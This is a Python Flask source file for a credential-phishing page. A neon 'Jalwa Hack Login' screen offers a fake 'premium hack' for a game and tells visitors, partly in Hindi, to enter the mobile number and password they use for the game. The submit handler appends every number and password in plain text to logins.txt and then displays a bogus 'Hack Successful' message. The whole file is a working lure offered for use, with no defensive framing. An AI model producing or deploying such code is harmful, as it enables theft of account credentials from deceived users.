from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def home():
    return '''
    <html>
    <head>
        <title>Jalwa Hack Login 🔥</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            @keyframes neonGlow {
                0% { text-shadow: 0 0 5px #39ff14, 0 0 10px #39ff14, 0 0 20px #39ff14; }
                50% { text-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff, 0 0 30px #00ffff; }
                100% { text-shadow: 0 0 5px #39ff14, 0 0 10px #39ff14, 0 0 20px #39ff14; }
            }
            @keyframes glitch {
                0% { transform: translate(0); }
                20% { transform: translate(-2px, 2px); }
                40% { transform: translate(-2px, -2px); }
                60% { transform: translate(2px, 2px); }
                80% { transform: translate(2px, -2px); }
                100% { transform: translate(0); }
            }
            body {
                margin: 0;
                padding: 0;
                height: 100vh;
                background: linear-gradient(135deg, #000000, #0f0f0f);
                font-family: monospace;
                display: flex;
                justify-content: center;
                align-items: center;
                color: #39ff14;
            }
            .container {
                text-align: center;
                background: rgba(0, 255, 0, 0.05);
                padding: 25px;
                border-radius: 15px;
                box-shadow: 0 0 25px #39ff14, 0 0 50px #ff0080;
                width: 90%;
                max-width: 400px;
            }
            h1 {
                color: #00ff00;
                font-size: 30px;
                margin-bottom: 10px;
                animation: neonGlow 2s infinite alternate, glitch 1s infinite;
            }
            p {
                color: #ff0080;
                font-size: 14px;
                text-shadow: 0 0 5px #ff0080;
            }
            input[type="text"], input[type="password"] {
                width: 90%;
                padding: 12px;
                margin: 10px 0;
                background-color: #000;
                color: #39ff14;
                border: 2px solid #ff0080;
                border-radius: 8px;
                font-size: 16px;
                box-shadow: 0 0 10px #ff0080;
            }
            input::placeholder {
                color: #39ff14;
                opacity: 0.7;
            }
            input[type="submit"] {
                width: 95%;
                padding: 12px;
                font-size: 18px;
                color: #000;
                background: linear-gradient(45deg, #39ff14, #00ffff, #ff0080);
                border: none;
                border-radius: 8px;
                cursor: pointer;
                box-shadow: 0 0 10px #00ffff, 0 0 20px #39ff14;
                animation: neonGlow 2s infinite alternate;
            }
            input[type="submit"]:hover {
                background: linear-gradient(45deg, #ff0080, #ff0000);
                box-shadow: 0 0 20px #ff0080, 0 0 30px #ff0000;
                color: #fff;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>JALWA LOGIN</h1>
            <p>Welcome to Rb premium Hack.<br>Sign in to continue. Activate Hack 🤖👾</p>
            <form action="/submit" method="post">
                <input type="text" name="number" placeholder="🆔 Enter Mobile Number"><br>
                <input type="password" name="password" placeholder="🔑 Enter Password"><br>
                <input type="submit" value="Sign In">
            </form>
            <p>Enter a valid 🆔 && password 🔑 🔑<br>
            (Aapne jis mobile number or password se game open kiya hai vhi mobile or password dalkr login kre)<br>
            Otherwise not access ♿ hack</p>
        </div>
    </body>
    </html>
    '''

@app.route('/submit', methods=['POST'])
def submit():
    number = request.form.get('number')
    password = request.form.get('password')
    with open("logins.txt", "a") as f:
        f.write(f"Number: {number}, Password: {password}\n")
    return '''
    <html>
    <head>
        <title>Hack Activated</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            @keyframes neonGlow {
                0% { text-shadow: 0 0 5px #39ff14, 0 0 10px #39ff14; }
                50% { text-shadow: 0 0 15px #00ffff, 0 0 30px #00ffff; }
                100% { text-shadow: 0 0 5px #39ff14, 0 0 10px #39ff14; }
            }
            body {
                background: linear-gradient(135deg, #000000, #0f0f0f);
                color: #00ff00;
                text-align: center;
                font-family: monospace;
                padding-top: 100px;
            }
            h2 {
                color: #00ff00;
                font-size: 24px;
                animation: neonGlow 2s infinite alternate;
            }
            p {
                color: #ff0080;
                font-size: 18px;
                text-shadow: 0 0 5px #ff0080;
            }
            a {
                color: #39ff14;
                font-size: 20px;
                text-shadow: 0 0 5px #39ff14;
            }
        </style>
    </head>
    <body>
        <h2>✅ Hack Successful! Activated!!</h2>
        <p>Welcome to Rb premium Hack.<br>Sign in to continue. Activate Hack 🤖👾</p>
        <a href="/">Back to Hack</a>
    </body>
    </html>
    '''

if __name__ == "__main__":
    app.run()
